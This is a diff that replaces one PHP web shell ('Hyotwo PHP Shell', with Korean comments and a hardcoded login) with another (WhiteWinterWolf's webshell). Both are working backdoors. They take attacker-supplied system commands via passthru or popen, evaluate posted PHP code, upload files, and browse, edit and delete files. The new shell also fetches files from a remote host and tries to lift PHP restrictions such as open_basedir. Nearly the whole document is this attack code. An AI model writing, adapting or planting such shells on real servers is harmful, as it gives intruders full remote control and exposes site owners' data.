@@ -1,429 +1,296 @@
-<!DOCTYPE html>
-<html>
-<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
-<title>Hyotwo PHP Shell</title>
-<style type="text/css"> </style>
+#<?php
+/*******************************************************************************
+ * Copyright 2017 WhiteWinterWolf
+ * https://www.whitewinterwolf.com/tags/php-webshell/
+ *
+ * This file is part of wwolf-php-webshell.
+ *
+ * wwwolf-php-webshell is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ ******************************************************************************/
 
-<body>
+/*
+ * Optional password settings.
+ * Use the 'passhash.sh' script to generate the hash.
+ * NOTE: the prompt value is tied to the hash!
+ */
+$passprompt = "WhiteWinterWolf's PHP webshell: ";
+$passhash = "";
 
-<body bgcolor='#000000'>
-<center><table width=90% cellpadding=0 cellspacing=0 style="border: 1px solid #666666">
-<tr><td width=100% height=70 bgcolor='white' style="border-bottom: 2px solid #666666" valign=top>
-<table valign=top>
-<tr><td valign=top>
-<table valign=center class='ram'>
-<tr><td width=5% align=right>
-<font size=2 color=#888888>System:</font>
-</td>
-<td width=100%>
-<font size=2 color=red><b><?php echo getsystem();?></b></font>
-</td></tr>
-<tr><td width=5% align=right>
-<font size=2 color=#888888>Server:</font>
-</td>
-<td width=100%>
-<font size=2 color=black><b><?php echo getserver();?></b></font>
+function e($s) { echo htmlspecialchars($s, ENT_QUOTES); }
 
-</table>
-</td>
-</body>
+function h($s)
+{
+	global $passprompt;
+	if (function_exists('hash_hmac'))
+	{
+		return hash_hmac('sha256', $s, $passprompt);
+	}
+	else
+	{
+		return bin2hex(mhash(MHASH_SHA256, $s, $passprompt));
+	}
+}
 
+function fetch_fopen($host, $port, $src, $dst)
+{
+	global $err, $ok;
+	$ret = '';
+	if (strpos($host, '://') === false)
+	{
+		$host = 'http://' . $host;
+	}
+	else
+	{
+		$host = str_replace(array('ssl://', 'tls://'), 'https://', $host);
+	}
+	$rh = fopen("${host}:${port}${src}", 'rb');
+	if ($rh !== false)
+	{
+		$wh = fopen($dst, 'wb');
+		if ($wh !== false)
+		{
+			$cbytes = 0;
+			while (! feof($rh))
+			{
+				$cbytes += fwrite($wh, fread($rh, 1024));
+			}
+			fclose($wh);
+			$ret .= "${ok} Fetched file <i>${dst}</i> (${cbytes} bytes)<br />";
+		}
+		else
+		{
+			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
+		}
+		fclose($rh);
+	}
+	else
+	{
+		$ret = "${err} Failed to open URL <i>${host}:${port}${src}</i><br />";
+	}
+	return $ret;
+}
+
+function fetch_sock($host, $port, $src, $dst)
+{
+	global $err, $ok;
+	$ret = '';
+	$host = str_replace('https://', 'tls://', $host);
+	$s = fsockopen($host, $port);
+	if ($s)
+	{
+		$f = fopen($dst, 'wb');
+		if ($f)
+		{
+			$buf = '';
+			$r = array($s);
+			$w = NULL;
+			$e = NULL;
+			fwrite($s, "GET ${src} HTTP/1.0\r\n\r\n");
+			while (stream_select($r, $w, $e, 5) && !feof($s))
+			{
+				$buf .= fread($s, 1024);
+			}
+			$buf = substr($buf, strpos($buf, "\r\n\r\n") + 4);
+			fwrite($f, $buf);
+			fclose($f);
+			$ret .= "${ok} Fetched file <i>${dst}</i> (" . strlen($buf) . " bytes)<br />";
+		}
+		else
+		{
+			$ret .= "${err} Failed to open file <i>${dst}</i><br />";
+		}
+		fclose($s);
+	}
+	else
+	{
+		$ret .= "${err} Failed to connect to <i>${host}:${port}</i><br />";
+	}
+	return $ret;
+}
+
+ini_set('log_errors', '0');
+ini_set('display_errors', '1');
+error_reporting(E_ALL);
+
+while (@ ob_end_clean());
+
+if (! isset($_SERVER))
+{
+	global $HTTP_POST_FILES, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
+	$_FILES = &$HTTP_POST_FILES;
+	$_POST = &$HTTP_POST_VARS;
+	$_SERVER = &$HTTP_SERVER_VARS;
+}
+
+$auth = '';
+$cmd = empty($_POST['cmd']) ? '' : $_POST['cmd'];
+$cwd = empty($_POST['cwd']) ? getcwd() : $_POST['cwd'];
+$fetch_func = 'fetch_fopen';
+$fetch_host = empty($_POST['fetch_host']) ? $_SERVER['REMOTE_ADDR'] : $_POST['fetch_host'];
+$fetch_path = empty($_POST['fetch_path']) ? '' : $_POST['fetch_path'];
+$fetch_port = empty($_POST['fetch_port']) ? '80' : $_POST['fetch_port'];
+$pass = empty($_POST['pass']) ? '' : $_POST['pass'];
+$url = $_SERVER['REQUEST_URI'];
+$status = '';
+$ok = '&#9786; :';
+$warn = '&#9888; :';
+$err = '&#9785; :';
+
+if (! empty($passhash))
+{
+	if (function_exists('hash_hmac') || function_exists('mhash'))
+	{
+		$auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];
+		if (h($auth) !== $passhash)
+		{
+			?>
+				<form method="post" action="<?php e($url); ?>">
+					<?php e($passprompt); ?>
+					<input type="password" size="15" name="pass">
+					<input type="submit" value="Send">
+				</form>
+			<?php
+			exit;
+		}
+	}
+	else
+	{
+		$status .= "${warn} Authentication disabled ('mhash()' missing).<br />";
+	}
+}
+
+if (! ini_get('allow_url_fopen'))
+{
+	ini_set('allow_url_fopen', '1');
+	if (! ini_get('allow_url_fopen'))
+	{
+		if (function_exists('stream_select'))
+		{
+			$fetch_func = 'fetch_sock';
+		}
+		else
+		{
+			$fetch_func = '';
+			$status .= "${warn} File fetching disabled ('allow_url_fopen'"
+				. " disabled and 'stream_select()' missing).<br />";
+		}
+	}
+}
+if (! ini_get('file_uploads'))
+{
+	ini_set('file_uploads', '1');
+	if (! ini_get('file_uploads'))
+	{
+		$status .= "${warn} File uploads disabled.<br />";
+	}
+}
+if (ini_get('open_basedir') && ! ini_set('open_basedir', ''))
+{
+	$status .= "${warn} open_basedir = " . ini_get('open_basedir') . "<br />";
+}
+
+if (! chdir($cwd))
+{
+  $cwd = getcwd();
+}
+
+if (! empty($fetch_func) && ! empty($fetch_path))
+{
+	$dst = $cwd . DIRECTORY_SEPARATOR . basename($fetch_path);
+	$status .= $fetch_func($fetch_host, $fetch_port, $fetch_path, $dst);
+}
+
+if (ini_get('file_uploads') && ! empty($_FILES['upload']))
+{
+	$dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
+	if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest))
+	{
+		$status .= "${ok} Uploaded file <i>${dest}</i> (" . $_FILES['upload']['size'] . " bytes)<br />";
+	}
+}
+?>
+
+<form method="post" action="<?php e($url); ?>"
+	<?php if (ini_get('file_uploads')): ?>
+		enctype="multipart/form-data"
+	<?php endif; ?>
+	>
+	<?php if (! empty($passhash)): ?>
+		<input type="hidden" name="auth" value="<?php e($auth); ?>">
+	<?php endif; ?>
+	<table border="0">
+		<?php if (! empty($fetch_func)): ?>
+			<tr><td>
+				<b>Fetch:</b>
+			</td><td>
+				host: <input type="text" size="15" id="fetch_host" name="fetch_host" value="<?php e($fetch_host); ?>">
+				port: <input type="text" size="4" id="fetch_port" name="fetch_port" value="<?php e($fetch_port); ?>">
+				path: <input type="text" size="40" id="fetch_path" name="fetch_path" value="">
+			</td></tr>
+		<?php endif; ?>
+		<tr><td>
+			<b>CWD:</b>
+		</td><td>
+			<input type="text" size="50" id="cwd" name="cwd" value="<?php e($cwd); ?>">
+			<?php if (ini_get('file_uploads')): ?>
+				<b>Upload:</b> <input type="file" id="upload" name="upload">
+			<?php endif; ?>
+		</td></tr>
+		<tr><td>
+			<b>Cmd:</b>
+		</td><td>
+			<input type="text" size="80" id="cmd" name="cmd" value="<?php e($cmd); ?>">
+		</td></tr>
+		<tr><td>
+		</td><td>
+			<sup><a href="#" onclick="cmd.value=''; cmd.focus(); return false;">Clear cmd</a></sup>
+		</td></tr>
+		<tr><td colspan="2" style="text-align: center;">
+			<input type="submit" value="Execute" style="text-align: right;">
+		</td></tr>
+	</table>
+	
+</form>
+<hr />
 
 <?php
- header('Content-Type: text/html; charset=utf-8');
-$self = $_SERVER['PHP_SELF'];
-$docr = $_SERVER['DOCUMENT_ROOT'];
-$sern = $_SERVER['SERVER_NAME'];
-$tend = "</tr></form></table><br><br><br><br>";
-$downFile = @$_GET["downFile"];
-$delFile = @$_GET["delFile"];
-$refileName = @$_GET["refileName"];
-$editFile = @$_GET["editFile"];
-
-// Configuration
-session_start();
-error_reporting(0);
-set_time_limit(9999999);
-$login='hyotwo';
-$password='123';
-$auth=1;
-
-
-//파일 다운로드
-if (isset($downFile)) 
-        {
-        #@set_time_limit(600);  #Limits the maximum execution time
-        $fileName = basename($downFile); //basename,filesize.readfile funtions use to read file.
-        header("Content-Type: application/force-download; name=".$fileName); //Set http header info
-        header("Content-Transfer-Encoding: binary");
-        header("Content-Disposition: attachment; fileName=".$fileName);
-        header("Expires: 0");
-        header("Cache-Control: no-cache, must-revalidate");
-        header("Pragma: no-cache");
-      }
-//파일 삭제
-if(isset($delFile)&& $delFile!=""){    
-        if(is_file($delFile)){     //Check if it is file type.
-            $message = (@unlink($delFile)) //unlink funtion : Delete file if success return true else false.
-              ? "<br><font color=red>삭제 완료'$delFile' </font></br>"
-              : "<br><font color=red>삭제 실패</font></br>" ;
-        }else{
-            $message = "<br><font color=red> '$delFile' 존재하지 않음</font></br>";
-        }
-        echo $message;
-      }
-
-//파일명 변경
-if (isset($refileName)){
-  echo '<table>';
-  echo '<form action="" method="post">';
-  echo '<br>';
-  echo '<tr>';
-  echo '<td align="left">';
-  echo '<font size="2">';
-  echo '새로운 이름:';
-  echo '<input type="text" name="newname"/>';
-  echo '<input type="submit" value="확인"/>';
-  echo '</tr></td></table>';
-  $oldname=basename($refileName); //Get old Name
-  if (@rename($oldname,$_POST['newname'])){
-       echo '<script>alert(\'설정 완료\')</script>';}
-  else
-    { if (!empty($_POST['newname']))
-        echo '<script>alert(\'설정 실패\')</script>';}
-}
-//파일 수정
-
-if (isset($editFile)) {
-  $content=basename($editFile);
-  if(empty($_POST['newcontent'])){ //No change or first time edit file.
-    echo '<table><tr>';
-    echo '<form action="" method="post">';
-    echo '<br><input type="submit" value="수정하기"/></br>';
-	echo '<br></br>';
-    echo '</tr>';    
-    $fp=@fopen("$content","r");#fopen,fread,filesize,fclos,fwrite functions used to operate file.
-    $data=@fread($fp,filesize($content));
-    echo '<tr>';
-    echo '<textarea name="newcontent" cols="80" rows="20" >';
-    echo $data;
-    @fclose($fp);
-    echo '</textarea></tr></form></table>';
-  }
-   if (!empty($_POST['newcontent'])) //If file is not empty
-    {
-       $fp=@fopen("$content","w+");
-       echo ($result=@fwrite($fp,$_POST['newcontent']))?"<font color=red>수정 완료</font>":"<font color=blue>수정 실패</font>"; 
-       @fclose($fp);
-    }
-} 
-
-
-
-function edit()
+if (! empty($status))
 {
-if ($_SESSION['edit'] == 1){
-$_SESSION['edit']=0;
-return "<br><center><input type=submit style=\"border:1px solid #666666;background:#333333;font-weight:bold;\" value=\"Save\"></center>";};
+	echo "<p>${status}</p>";
 }
 
-function getsystem()
+echo "<pre>";
+if (! empty($cmd))
 {
-	return php_uname('s')." ".php_uname('r')." ".php_uname('v');
-};	
-
-function getserver()
-{
-	return getenv("SERVER_SOFTWARE");
-};
-
-function pwd()
-{
-if($_POST['type']==3)
+	echo "<b>";
+	e($cmd);
+	echo "</b>\n";
+	if (DIRECTORY_SEPARATOR == '/')
 	{
-		$_SESSION['pwd'] = stripslashes($_POST['value']);
+		$p = popen('exec 2>&1; ' . $cmd, 'r');
 	}
-chdir($_SESSION['pwd']);
-$cwd = getcwd();
-if($u=strrpos($cwd,'/'))
+	else
 	{
-		if($u!=strlen($cwd)-1){
-		return $cwd.'/';}
-		else{return $cwd;};
+		$p = popen('cmd /C "' . $cmd . '" 2>&1', 'r');
 	}
-elseif($u=strrpos($cwd,'\\'))
+	while (! feof($p))
 	{
-		if($u!=strlen($cwd)-1){
-		return $cwd.'\\';}
-		else{return $cwd;};
-	};
+		echo htmlspecialchars(fread($p, 4096), ENT_QUOTES);
+		@ flush();
+	}
 }
+echo "</pre>";
 
-
-if(@$_POST['action']=="exit")unset($_SESSION['hyo']);
-if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SESSION['hyo']=1;}else $_SESSION['hyo']='1';
-if(@$_SESSION['hyo']==0){
-echo $header;
-echo '<center><table><form method="POST"><tr><td>Login:</td><td><input type="text" name="login" value=""></td></tr><tr><td>Password:</td><td><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="Enter"></td></tr></form></table></center>';
-echo $footer;
-exit;}
-
-
-if (!empty($_GET['ac'])) {$ac = $_GET['ac'];}
-elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}
-
-
-
-
-
-// Menu
-echo "
-|<a href=$self?ac=explore>디렉터리 뷰</a>|
-|<a href=$self?ac=shell>명령어</a>|
-|<a href=$self?ac=upload>파일업로드</a>|
-|<a href=$self?ac=tools>도구</a>|
-|<a href=$self?ac=eval>PHP Eval Code</a>|
-|<a href=$self?ac=info>PHP info</a>|
-<br><br><br><pre>";
-
-
-
-switch($ac) {
-
-// PHP 인포
-case "info":
-
-if(@$_GET['ac']=="info"){
-@phpinfo();
-exit;}
-
-break;
-
-// 명령어
-case "shell":
-
-
-echo <<<HTML
-<font size=3 color=black><b>Shell</b></font>
-<table>
-<form action="$self" method="POST">
-<input type="hidden" name="ac" value="shell">
-<tr><td>
-$$sern <input size="50" type="text" name="a"><input align="right" type="submit" value="Enter">
-</td></tr>
-<tr><td>
-
-<textarea cols="100" rows="25">
-HTML;
-
-
-if (!empty($_POST['a'])){
-passthru($_POST['a']);
-}
-echo "</textarea></td>$tend";
-
-break;
-
-
-
-
-
-
-
-//PHP Eval Code 
-case "eval":
-
-
-echo <<<HTML
-<font size=3 color=black><b>PHP Eval</b></font>
-<table>
-<form method="POST" action="$self">
-<input type="hidden" name="ac" value="eval">
-<tr>
-<td><textarea name="ephp" rows="10" cols="60"></textarea></td>
-</tr>
-<tr>
-<td><input type="submit" value="Enter"></td>
-$tend
-HTML;
-
-if (isset($_POST['ephp'])){
-eval($_POST['ephp']);
-}
-break;
-
-
-//도구
-case "tools":
-
-echo <<<HTML
-<font size=3 color=black><b>Tool</b></font>
-<table>
-<form method="POST" action="$self">
-<input type="hidden" name="dir" value="tools">
-<tr>
-<td>
-<input type="radio" name="tac" value="1">B64 Decode<br>
-<input type="radio" name="tac" value="2">B64 Encode<br><hr>
-<input type="radio" name="tac" value="3">md5 Hash
-</td>
-<td><textarea name="tot" rows="5" cols="42"></textarea></td>
-</tr>
-<tr>
-<td> </td>
-<td><input type="submit" value="Enter"></td>
-$tend
-HTML;
-
-if (!empty($_POST['tot']) && !empty($_POST['tac'])) {
-
-switch($_POST['tac']) {
-
-case "1":
-echo "디코딩 결과:<b>" .base64_decode($_POST['tot']). "</b>";
-break;
-
-case "2":
-echo "인코딩 결과:<b>" .base64_encode($_POST['tot']). "</b>";
-break;
-
-case "3":
-echo "md5 해쉬값:<b>" .md5($_POST['tot']). "</b>";
-break;
-}}
-break;
-
-
-// 파일 업로드
-case "upload":
-
-echo <<<HTML
-<font size=3 color=black><b>File Upload</b></font>
-<table>
-<form enctype="multipart/form-data" action="$self" method="POST">
-<input type="hidden" name="ac" value="upload">
-<tr>
-<td>업로드 파일:</td>
-<td><input size="48" name="file" type="file"></td>
-</tr>
-<tr>
-<td>업로드 경로:</td>
-<td><input size="48" value="$docr/" name="path" type="text"><input type="submit" value="실행"></td>
-$tend
-HTML;
-
-if (isset($_POST['path'])){
-
-$uploadfile = $_POST['path'].$_FILES['file']['name'];
-if ($_POST['path']==""){$uploadfile = $_FILES['file']['name'];}
-
-if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
-    echo "업로드 경로: $uploadfile\n";
-    echo "업로드 파일명:" .$_FILES['file']['name']. "\n";
-    echo "업로드 파일 크기:" .$_FILES['file']['size']. "\n";
-
-} else {
-    print "오류발생\n";
-    print_r($_FILES);
-}
-}
-break;
-
-
-
-
-
-//디렉터리 뷰
-case "explore":
- ?>
-
-<table>
-			<tr>
-				<td>홈 디렉터리:
-					<a href="?ac=explore&dir=<?php echo $_SERVER['DOCUMENT_ROOT'];?>">
-					<?php echo $_SERVER['DOCUMENT_ROOT'];?></a>
-				</td>
-			</tr>
-			<tr>
-				<td>현재 경로:<?php
-					$dir=@$_GET['dir'];
-					if (!isset($dir) or empty($dir)) {
-					  $dir=str_replace('\\','/',dirname(__FILE__));
-					  echo "<font color=\"#00688B\">".$dir."</font>";
-					} else {
-					  
-					  echo "<font color=\"#00688B\">".$dir."</font>";
-					}
-					?>
-				</td>
-			</tr>
-			
-
-<table width="100%" border="0" cellpadding="3" cellspacing="1">
-		<tr>
-		<td><b>디렉터리 목록</b></td>
-		</tr>
-		<tr>
-		<?php
-		$dirs=@opendir($dir);
-		while ($file=@readdir($dirs)) { //Print sub dir and file.
-		  $b="$dir/$file";
-		  $a=@is_dir($b);
-		  if($a=="1"){
-			if($file!=".."&&$file!=".")  {
-				 
-				 echo "<th style=word-break:break-all>";
-				 echo "<a href=\"?ac=explore&dir=".urlencode($dir)."/".urlencode($file)."\">$file</a>";
-				 echo "</th>";
-				  
-			} else {
-				 if($file=="..")
-				 echo "<a href=\"?ac=explore&dir=".urlencode($dir)."/".urlencode($file)."\">상위 디렉터리</a>";
-				}
-			}
-		}
-		@closedir($dirs);
-		?>
-		</tr>
-		</table>
-		<hr>
-		<table width="100%" border="0" cellpadding="3" cellspacing="1">
-			<tr>
-				<td><b>FileName</b></td>
-				<td><b>FileDate</b></td>
-				<td><b>FileSize</b></td>
-				<td><b>FileOperations</b></td>
-			</tr>
-
-			<?php
-			//Print all file
-			$dirs=@opendir($dir);
-			while ($file=@readdir($dirs)){
-				$b="$dir/$file";
-				$a=@is_dir($b);
-				if($a=="0"){
-					$size=@filesize("$dir/$file")/1024; 
-					$lastsave=@date("Y-n-d H:i:s",filectime("$dir/$file"));
-					echo "<tr>\n";
-					echo "<td>$file</td>\n";
-					echo "<td>$lastsave</td>\n";
-					echo "<td>$size KB</td>\n";
-					echo "<td><a href=\"?downFile=".urlencode($dir)."/".urlencode($file)."\"> [Down] </a>
-							  <a href=\"?delFile=".urlencode($dir)."/".urlencode ($file)."\"> [Delete]</a>
-							  <a href=\"?refileName=".urlencode($dir)."/".urlencode($file)."\"> [Rename] </a>
-							  <a href=\"?editFile=".urlencode($dir)."/".urlencode($file)."\"> [Edit] </a></td>\n";
-							 
-							  
-					echo "</tr>\n";
-				}
-			}
-			@closedir($dirs);
-		}
-	?> 
-		</table>
-
-
-		
-</pre>
-</body>
-</html>
+exit;
+?>
